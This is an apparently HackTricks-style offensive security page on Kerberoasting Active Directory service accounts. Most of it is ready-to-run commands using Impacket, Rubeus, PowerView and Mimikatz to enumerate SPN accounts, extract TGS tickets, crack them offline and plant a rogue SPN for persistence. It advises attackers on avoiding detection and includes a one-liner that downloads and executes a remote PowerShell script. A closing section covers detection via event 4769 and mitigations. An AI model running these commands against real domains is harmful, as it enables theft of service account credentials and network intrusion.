## Kerberoast

Kerberoasting focuses on the acquisition of **TGS tickets**, specifically those related to services operating under **user accounts** in **Active Directory (AD)**, excluding **computer accounts**. The encryption of these tickets utilizes keys that originate from **user passwords**, allowing for the possibility of **offline credential cracking**. The use of a user account as a service is indicated by a non-empty **"ServicePrincipalName"** property.

For executing **Kerberoasting**, a domain account capable of requesting **TGS tickets** is essential; however, this process does not demand **special privileges**, making it accessible to anyone with **valid domain credentials**.

### Key Points:

- **Kerberoasting** targets **TGS tickets** for **user-account services** within **AD**.
- Tickets encrypted with keys from **user passwords** can be **cracked offline**.
- A service is identified by a **ServicePrincipalName** that is not null.
- **No special privileges** are needed, just **valid domain credentials**.

### **Attack**

> [!WARNING]
> **Kerberoasting tools** typically request **`RC4 encryption`** when performing the attack and initiating TGS-REQ requests. This is because **RC4 is** [**weaker**](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256.\
> RC4 (type 23) hashes begin with **`$krb5tgs$23$*`** while AES-256(type 18) start with **`$krb5tgs$18$*`**`.`
> Moreover, be careful because `Rubeus.exe kerberoast` request tickets automatically over ALL the vulnerable accounts which will get you detected. First, find kerberoastable users with interesting privileges and then run it nly over them.

```bash

#### **Linux**

```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```

Multi-features tools including a dump of kerberoastable users:

```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```

#### Windows

- **Enumerate Kerberoastable users**

```bash
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```

- **Technique 1: Ask for TGS and dump it from memory**

```bash
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

- **Technique 2: Automatic tools**

```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```

> [!WARNING]
> When a TGS is requested, Windows event `4769 - A Kerberos service ticket was requested` is generated.

### Cracking

```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```

### Persistence

If you have **enough permissions** over a user you can **make it kerberoastable**:

```bash
 Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```

You can find useful **tools** for **kerberoast** attacks here: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

If you find this **error** from Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** it because of your local time, you need to synchronise the host with the DC. There are a few options:

- `ntpdate <IP of DC>` - Deprecated as of Ubuntu 16.04
- `rdate -n <IP of DC>`

### Mitigation

Kerberoasting can be conducted with a high degree of stealthiness if it is exploitable. In order to detect this activity, attention should be paid to **Security Event ID 4769**, which indicates that a Kerberos ticket has been requested. However, due to the high frequency of this event, specific filters must be applied to isolate suspicious activities:

- The service name should not be **krbtgt**, as this is a normal request.
- Service names ending with **$** should be excluded to avoid including machine accounts used for services.
- Requests from machines should be filtered out by excluding account names formatted as **machine@domain**.
- Only successful ticket requests should be considered, identified by a failure code of **'0x0'**.
- **Most importantly**, the ticket encryption type should be **0x17**, which is often used in Kerberoasting attacks.

```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```

To mitigate the risk of Kerberoasting:

- Ensure that **Service Account Passwords are difficult to guess**, recommending a length of more than **25 characters**.
- Utilize **Managed Service Accounts**, which offer benefits like **automatic password changes** and **delegated Service Principal Name (SPN) Management**, enhancing security against such attacks.

By implementing these measures, organizations can significantly reduce the risk associated with Kerberoasting.

## Kerberoast w/o domain account

In **September 2022**, a new way to exploit a system was brought to light by a researcher named Charlie Clark, shared through his platform [exploit.ph](https://exploit.ph/). This method allows for the acquisition of **Service Tickets (ST)** via a **KRB_AS_REQ** request, which remarkably does not necessitate control over any Active Directory account. Essentially, if a principal is set up in such a way that it doesn't require pre-authentication—a scenario similar to what's known in the cybersecurity realm as an **AS-REP Roasting attack**—this characteristic can be leveraged to manipulate the request process. Specifically, by altering the **sname** attribute within the request's body, the system is deceived into issuing a **ST** rather than the standard encrypted Ticket Granting Ticket (TGT).

The technique is fully explained in this article: [Semperis blog post](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).
